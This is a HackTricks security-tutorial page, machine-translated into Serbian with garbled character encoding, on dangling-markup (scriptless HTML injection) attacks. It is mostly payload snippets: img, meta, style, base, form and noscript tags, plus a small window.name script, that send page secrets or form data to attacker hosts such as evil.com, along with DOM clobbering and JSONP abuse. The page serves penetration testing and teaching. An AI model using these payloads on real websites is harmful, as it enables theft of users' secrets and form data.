# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Rezime

Ova tehnika moÅ¾e se koristiti za izvlaÄenje informacija od korisnika kada se pronaÄ‘e **HTML ubacivanje**. Ovo je veoma korisno ako ne moÅ¾ete **pronaÄ‡i naÄin da iskoristite** [**XSS** ](../xss-cross-site-scripting/), ali moÅ¾ete **ubaciti neke HTML oznake**.\
TakoÄ‘e je korisno ako je neka **tajna saÄuvana u Äistom tekstu** u HTML-u i Å¾elite je **eksfiltrirati** sa klijenta, ili ako Å¾elite da zavarate izvrÅ¡enje nekog skripta.

Nekoliko tehnika komentarisanih ovde moÅ¾e se koristiti za zaobilaÅ¾enje nekih [**Content Security Policy**](../content-security-policy-csp-bypass/) eksfiltriranjem informacija na neoÄekivane naÄine (html oznake, CSS, http-meta oznake, forme, base...).

## Glavne Primene

### KraÄ‘a tajni u Äistom tekstu

Ako ubacite `<img src='http://evil.com/log.cgi?` kada se stranica uÄita, Å¾rtva Ä‡e vam poslati sav kod izmeÄ‘u ubaÄene `img` oznake i sledeÄ‡e navodnika unutar koda. Ako se tajna naÄ‘e u tom delu, ukradeÄ‡ete je (moÅ¾ete uraditi istu stvar koristeÄ‡i dvostruki navodnik, pogledajte Å¡ta bi moglo biti interesantnije za koriÅ¡Ä‡enje).

Ako je `img` oznaka zabranjena (zbog CSP na primer) takoÄ‘e moÅ¾ete koristiti `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`

```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

Napomena da **Chrome blokira HTTP URL-ove** sa "<" ili "\n" u njima, pa moÅ¾ete pokuÅ¡ati sa drugim protokolima kao Å¡to je "ftp".

TakoÄ‘e moÅ¾ete zloupotrebiti CSS `@import` (Ä‡e poslati sav kod dok ne pronaÄ‘e ";")

```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```

TakoÄ‘e moÅ¾ete koristiti **`<table`**:

```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```

MoÅ¾ete takoÄ‘e ubaciti `<base` oznaku. Sve informacije Ä‡e biti poslate dok se navod ne zatvori, ali zahteva neku interakciju korisnika (korisnik mora da klikne na neki link, jer Ä‡e base oznaka promeniti domen na koji link pokazuje):

```html
<base target='        <--- Injected
steal me'<b>test</b>
```

### KraÄ‘a formi

```html
<base href='http://evil.com/'>
```

Zatim, obrasci koji Å¡alju podatke putanji (kao `<form action='update_profile.php'>`) Ä‡e slati podatke na zlonamernu domenu.

### KraÄ‘a obrazaca 2

Postavite zaglavlje obrasca: `<form action='http://evil.com/log_steal'>` ovo Ä‡e prepisati sledeÄ‡e zaglavlje obrasca i svi podaci iz obrasca Ä‡e biti poslati napadaÄu.

### KraÄ‘a obrazaca 3

Dugme moÅ¾e promeniti URL na koji Ä‡e informacije iz obrasca biti poslate pomoÄ‡u atributa "formaction":

```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```

NapadaÄ moÅ¾e koristiti ovo da ukrade informacije.

PronaÄ‘ite [**primer ovog napada u ovom opisu**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### KraÄ‘a tajnih tekstualnih informacija 2

KoristeÄ‡i poslednju pomenutu tehniku za kraÄ‘u formi (ubacivanje novog zaglavlja forme) moÅ¾ete zatim ubaciti novo polje za unos:

```html
<input type='hidden' name='review_body' value="
```

i ovo polje za unos Ä‡e sadrÅ¾ati sav sadrÅ¾aj izmeÄ‘u njegovih dvostrukih navodnika i sledeÄ‡ih dvostrukih navodnika u HTML-u. Ovaj napad meÅ¡a "_**KraÄ‘u tajnih tekstova u Äistom obliku**_" sa "_**KraÄ‘om formi2**_".

MoÅ¾ete uraditi istu stvar ubacivanjem forme i `<option>` oznake. Svi podaci dok se ne pronaÄ‘e zatvoreni `</option>` Ä‡e biti poslati:

```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

### Ubacivanje parametara obrasca

MoÅ¾ete promeniti putanju obrasca i ubaciti nove vrednosti kako bi se izvrÅ¡ila neoÄekivana radnja:

```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```

### KraÄ‘a tajnih tekstova u Äistom obliku putem noscript

`<noscript></noscript>` je oznaka Äiji Ä‡e sadrÅ¾aj biti tumaÄen ako pregledaÄ ne podrÅ¾ava JavaScript (moÅ¾ete omoguÄ‡iti/onemoguÄ‡iti JavaScript u Chrome-u na [chrome://settings/content/javascript](chrome://settings/content/javascript)).

NaÄin za eksfiltraciju sadrÅ¾aja web stranice od taÄke ubacivanja do dna ka sajtu pod kontrolom napadaÄa biÄ‡e ubacivanje ovoga:

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

### Bypassing CSP sa korisniÄkom interakcijom

Iz ovog [portswiggers istraÅ¾ivanja](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¾ete nauÄiti da Äak i iz **najstroÅ¾e ograniÄenih CSP okruÅ¾enja** moÅ¾ete i dalje **izfiltrirati podatke** sa odreÄ‘enom **korisniÄkom interakcijom**. U ovom sluÄaju Ä‡emo koristiti payload:

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```

Napomena da Ä‡ete zatraÅ¾iti od **Å¾rtve** da **klikne na link** koji Ä‡e je **preusmeriti** na **payload** koji kontroliÅ¡ete. TakoÄ‘e, obratite paÅ¾nju da Ä‡e **`target`** atribut unutar **`base`** oznake sadrÅ¾ati **HTML sadrÅ¾aj** do sledeÄ‡eg jednostrukog navodnika.\
To Ä‡e rezultirati time da Ä‡e **vrednost** **`window.name`** biti sav taj **HTML sadrÅ¾aj** kada se klikne na link. Stoga, poÅ¡to **kontroliÅ¡ete stranicu** na koju Å¾rtva pristupa klikom na link, moÅ¾ete pristupiti tom **`window.name`** i **eksfiltrirati** te podatke:

```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

### ZavaravajuÄ‡i radni tok skripte 1 - Napad na HTML namespace

Umetnite novu oznaku sa id-om unutar HTML-a koja Ä‡e prepisati sledeÄ‡u i sa vrednoÅ¡Ä‡u koja Ä‡e uticati na tok skripte. U ovom primeru birate sa kim Ä‡e se informacije deliti:

```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```

### ZavaravajuÄ‡i radni tok skripte 2 - Napad na skriptni prostor imena

Kreirajte promenljive unutar JavaScript prostora imena ubacivanjem HTML tagova. Zatim Ä‡e ova promenljiva uticati na tok aplikacije:

```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```

### Zloupotreba JSONP

Ako pronaÄ‘ete JSONP interfejs, moÅ¾ete pozvati proizvoljnu funkciju sa proizvoljnim podacima:

```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```

Ili Äak moÅ¾ete pokuÅ¡ati da izvrÅ¡ite neki JavaScript:

```html
<script src='/search?q=a&call=alert(1)'></script>
```

### Zloupotreba Iframe-a

Dete dokument poseduje moguÄ‡nost da pregleda i modifikuje `location` svojstvo svojih roditelja, Äak i u situacijama prekograniÄnog saobraÄ‡aja. Ovo omoguÄ‡ava ugraÄ‘ivanje skripte unutar **iframe-a** koja moÅ¾e preusmeriti klijenta na proizvoljnu stranicu:

```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```

Ovo se moÅ¾e ublaÅ¾iti neÄim poput: `sandbox=' allow-scripts allow-top-navigation'`

Iframe takoÄ‘e moÅ¾e biti zloupotrebljen da bi procurene osetljive informacije sa druge stranice **koristeÄ‡i atribut imena iframe-a**. To je zato Å¡to moÅ¾ete kreirati iframe koji ugraÄ‘uje sam sebe zloupotrebljavajuÄ‡i HTML ubacivanje koje Äini da **osetljive informacije izgledaju unutar atributa imena iframe-a** i zatim pristupiti tom imenu iz poÄetnog iframe-a i procuriti ga.

```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```

Za viÅ¡e informacija pogledajte [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta zloupotreba

MoÅ¾ete koristiti **`meta http-equiv`** da izvrÅ¡ite **nekoliko radnji** poput postavljanja Cookie-a: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ili izvoÄ‘enje preusmeravanja (u ovom sluÄaju za 5s): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Ovo se moÅ¾e **izbeÄ‡i** sa **CSP** u vezi sa **http-equiv** (`Content-Security-Policy: default-src 'self';`, ili `Content-Security-Policy: http-equiv 'self';`)

### Novi \<portal HTML tag

MoÅ¾ete pronaÄ‡i veoma **interesantna istraÅ¾ivanja** o iskoriÅ¡Ä‡ivim ranjivostima taga \<portal [ovde](https://research.securitum.com/security-analysis-of-portal-element/).\
U trenutku pisanja ovog teksta, morate omoguÄ‡iti tag portala na Chrome-u u `chrome://flags/#enable-portals` ili neÄ‡e raditi.

```html
<portal src='https://attacker-server?
```

### HTML Curenje

Nisu sve metode curenja povezanosti u HTML-u korisne za Dangling Markup, ali ponekad mogu pomoÄ‡i. Proverite ih ovde: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Curenja

Ovo je **miks** izmeÄ‘u **dangling markup i XS-Curenja**. Sa jedne strane, ranjivost omoguÄ‡ava **ubacivanje HTML-a** (ali ne JS-a) na stranici **istog porekla** kao i ona koju Ä‡emo napadati. S druge strane, neÄ‡emo **napadati** direktno stranicu na koju moÅ¾emo ubaciti HTML, veÄ‡ **drugu stranicu**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Pretraga/XS-Curenja

XS-Pretraga je usmerena na **eksfiltraciju informacija preko granica porekla** zloupotrebom **napada boÄnim kanalom**. Stoga, to je drugaÄija tehnika od Dangling Markup-a, meÄ‘utim, neke od tehnika zloupotrebljavaju ukljuÄivanje HTML oznaka (sa i bez izvrÅ¡enja JS-a), poput [**Ubacivanja CSS-a**](../xs-search/#css-injection) ili [**UÄitavanja slika na zahtev**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Lista Detekcije Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Reference

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
